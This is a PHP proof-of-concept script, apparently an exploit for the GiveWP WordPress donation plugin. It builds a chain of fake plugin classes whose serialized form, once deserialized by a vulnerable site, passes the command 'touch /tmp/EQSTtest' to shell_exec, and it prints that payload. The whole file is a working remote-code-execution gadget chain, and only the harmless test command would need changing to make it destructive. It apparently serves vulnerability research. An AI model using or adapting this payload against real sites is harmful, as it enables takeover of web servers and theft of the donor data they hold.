<?php
namespace Stripe{
	class StripeObject
	{
		protected $_values;
		public function __construct(){
			$this->_values['foo'] = new \Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData();
		}
	}
}

namespace Give\PaymentGateways\DataTransferObjects{
	class GiveInsertPaymentData{
    public $userInfo;
		public function __construct()
    {
        $this->userInfo['address'] = new \Give();
    } 
	}
}	

namespace{
	class Give{
		protected $container;
		public function __construct()
		{
			$this->container = new \Give\Vendors\Faker\ValidGenerator();
		}
	}
}

namespace Give\Vendors\Faker{
	class ValidGenerator{
		protected $validator;
		protected $generator;
		public function __construct()
		{
			$this->validator = "shell_exec";
			$this->generator = new \Give\Onboarding\SettingsRepository();
		}
	}
}

namespace Give\Onboarding{
	class SettingsRepository{
		protected $settings;
		public function __construct()
		{
			$this -> settings['address1'] = 'touch /tmp/EQSTtest';
		}
	}
}

namespace{
	$a = new Stripe\StripeObject();
	echo serialize($a);
}
